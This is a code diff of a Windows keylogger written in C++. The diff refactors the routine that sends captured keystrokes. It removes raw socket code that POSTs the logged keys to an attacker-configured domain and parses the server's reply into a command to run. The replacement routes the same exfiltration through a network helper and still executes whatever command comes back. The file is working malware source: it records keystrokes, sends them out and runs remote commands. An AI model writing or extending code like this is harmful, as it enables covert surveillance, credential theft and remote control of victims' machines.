@@ -1,6 +1,7 @@
 #include "stdafx.h"
 #include "Keylogger.h"
 #include "Hax.h"
+#include "Network.h"
 
 #pragma comment(lib, "Ws2_32.lib")
 
@@ -49,7 +50,7 @@ const char* keyStringsNoShift[] =
     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
 };
 
-Keylogger::Keylogger() : cmdBufLen(sizeof(cmdBuf))
+Keylogger::Keylogger()
 {
     TCHAR *appData;
     size_t appDataSize;
@@ -135,7 +136,7 @@ void Keylogger::CheckKey(short i, bool shift)
 
 void Keylogger::Send()
 {
-    std::string msgText;
+    std::string msgText = "d=";
 
     std::vector<const char*>::const_iterator itr;
     for (   itr = keysPressed.begin();
@@ -145,77 +146,7 @@ void Keylogger::Send()
         msgText += *itr;
     }
 
-    std::string request =
-                "POST " V_NET_FILE " HTTP/1.1\r\n"
-                "Host: " V_NET_DOMAIN "\r\n"
-                "Content-Type: application/x-www-form-urlencoded\r\n"
-                "Content-Length: ";
-    request += std::to_string(2 + msgText.size());
-    request += "\r\n\r\n" "d=";
-    request += msgText;
-    request += "\r\n";
+    cmd.Run(network.SendPost(msgText.c_str(), msgText.size()));
 
-    //MessageBoxA(NULL, request.c_str(), NULL, MB_OK);
-
-    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
-
-    struct hostent *host;
-	host = gethostbyname(V_NET_DOMAIN);
-
-    SOCKADDR_IN sin;
-    ZeroMemory(&sin, sizeof(sin));
-	sin.sin_addr.s_addr = *((unsigned long*)host->h_addr);
-    sin.sin_family = AF_INET;
-    sin.sin_port = htons(80);
-
-    if (connect(sock, (struct sockaddr *) &sin, sizeof(sin)) < 0)
-    {
-        Error(_T("connect() failed"));
-        return;
-    }
-
-    if (send(sock, request.c_str(), request.length(), 0) != request.length())
-    {
-        Error(_T("send() sent a different number of bytes than expected"));
-        closesocket(sock);
-        return;
-    }
-
-    int bufLen = recv(sock, cmdBuf, (this->cmdBufLen-1), 0);
-    if (bufLen > 0)
-    {
-        cmdBuf[bufLen] = '\0';
-        this->ReadData(bufLen);
-    }
-
-    closesocket(sock);
     return;
-}
-
-void Keylogger::ReadData(int len)
-{
-    int linebreaks = 0;
-    char *start = cmdBuf;
-
-    while(*start != '\0') {
-        switch(*start) {
-        case '\r':
-        case '\n':
-            ++linebreaks;
-            break;
-        default:
-            linebreaks = 0;
-        }
-
-        ++start;
-
-        if (linebreaks == 4) {
-            break;
-        }
-    }
-
-    if (*start != '\0')
-    {
-        cmd.Run(start);
-    }
 }
